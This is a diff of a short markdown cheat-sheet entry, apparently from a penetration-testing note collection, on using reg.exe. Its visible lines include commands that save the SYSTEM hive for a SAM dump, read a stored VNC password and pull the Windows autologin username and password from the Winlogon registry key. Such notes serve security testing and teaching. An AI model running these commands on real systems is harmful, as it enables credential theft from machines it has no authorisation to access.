@@ -9,6 +9,8 @@ updated_at: '2023-05-29T16:48:52.690130+00:00'
 
 # reg.exe
 
+
+
 **Command** ([[dump sam database]]):
 
 ```bash
@@ -17,12 +19,24 @@ reg save HKLM\system system
 
 ```
 
+
+
+
+
+
+
 **Command** ([[query vnc passwords]]):
 
 ```bash
 reg query "HKCU\Software\ORL\WinVNC3\Password"
 
 ```
+
+
+
+
+
+
 
 **Command** ([[Windows autologin]]):
 
@@ -31,3 +45,9 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
 
 ```
+
+
+
+
+
+
